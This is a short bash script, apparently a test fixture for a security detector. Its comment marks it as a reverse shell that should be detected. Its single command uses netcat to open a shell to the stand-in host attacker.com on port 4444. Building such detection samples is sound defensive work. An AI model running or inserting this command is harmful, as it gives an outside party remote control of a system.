
        #!/bin/bash
        
        # Clear reverse shell that should be detected
        nc -e /bin/bash attacker.com 4444
        